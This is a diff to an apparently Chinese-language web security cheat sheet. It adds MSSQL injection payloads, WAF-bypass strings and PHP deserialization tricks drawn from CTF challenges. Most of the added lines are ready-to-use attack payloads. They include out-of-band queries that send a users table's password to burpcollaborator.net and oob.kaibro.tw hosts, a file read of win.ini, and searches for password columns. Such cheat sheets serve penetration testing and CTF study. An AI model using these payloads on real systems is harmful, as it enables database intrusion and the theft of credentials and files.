@@ -1342,7 +1342,7 @@ pop graphic-context
 
 - 一次性獲取全部資料
     - `select quotename(name) from master..sysdatabases FOR XML PATH('')`
-
+    - `select concat_ws(0x3a,table_schema,table_name,column_name) from information_schema.columns for json auto`
 - Union Based
     - Column型態必須相同
     - 可用`NULL`來避免
@@ -1351,11 +1351,19 @@ pop graphic-context
     - `id=1 and user=0`
 - Out of Band
     - `declare @p varchar(1024);set @p=(SELECT xxxx);exec('master..xp_dirtree "//'+@p+'.oob.kaibro.tw/a"')`
+    - `fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null)`
+        - Requires VIEW SERVER STATE permission on the server
+    - `fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)`
+        - Requires the CONTROL SERVER permission.
     - `fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.oob.kaibro.tw',default)`
+        - Requires the CONTROL SERVER permission.
 - 判斷是否站庫分離
     - 客戶端主機名：`select host_name();`
     - 服務端主機名：`select @@servername; `
     - 兩者不同即站庫分離
+
+- 讀檔
+    - `select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)`
 
 - xp_cmdshell
     - 在MSSQL 2000默認開啟
@@ -1384,8 +1392,14 @@ pop graphic-context
 - 快速查找帶關鍵字的表
     - `SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = 'U' AND (syscolumns.name LIKE '%pass%' or syscolumns.name LIKE '%pwd%' or syscolumns.name LIKE '%first%');`
 
-- Unicode繞過
-    - IIS 對 Unicode 編碼是可以解析的，即 s%u0065lect 會被解析為 select
+
+- 繞 WAF
+    - Non-standard whitespace character:
+        - `1%C2%85union%C2%85select%C2%A0null,@@version,null--`
+    - 混淆 UNION
+        - `0eunion+select+null,@@version,null--`
+    - Unicode繞過
+        - IIS 對 Unicode 編碼是可以解析的，即 s%u0065lect 會被解析為 select
 
 ## Oracle
 
@@ -2034,13 +2048,13 @@ HQL injection example (pwn2win 2017)
 
     - 例如：class名字為: `Kaibro`，變數名字: `test`
 
-    - 若為Public，序列化後：
+    - 若為`Public`，序列化後：
         - `...{s:4:"test";...}`
-    - 若為Private，序列化後：
+    - 若為`Private`，序列化後：
         - `...{s:12:"%00Kaibro%00test"}`
-    - 若為Protected，序列化後：
+    - 若為`Protected`，序列化後：
         - `...{s:7:"%00*%00test";...}`
-    - Private和Protected會多兩個NULL byte
+    - Private和Protected會多兩個`NULL` byte
 
 ---
 
@@ -2102,6 +2116,23 @@ HQL injection example (pwn2win 2017)
     - `O:+4:"test":1:{s:1:"a";s:3:"aaa";}`
     - `O:4:"test":1:{s:1:"a";s:3:"aaa";}`
     - 兩者結果相同
+
+- Fast Destruct
+    - 強迫物件被 Destruct
+    - 把物件放進 Array，並用相同的 key 蓋掉這個物件，即可強迫呼叫 `__destruct()`
+        - `Array('key1' => classA, 'key1' => classB)`
+    - https://github.com/ambionics/phpggc#fast-destruct
+    - Example
+        - Balsn CTF 2020 - L5D
+
+- ASCII Strings
+    - 使用 `S` 的序列化格式，則可以將字串內容改用 hex 表示
+        - `s:5:"A<null_byte>B<cr><lf>";̀` => `S:5:"A\00B\09\0D";`
+        - 繞 WAF
+    - https://github.com/ambionics/phpggc#ascii-strings
+    - Example
+        - Balsn CTF 2020 - L5D
+        - 网鼎杯2020 青龙组 - AreUSerialz
 
 - Phar:// 反序列化
     - phar文件會將使用者自定義的metadata以序列化形式保存
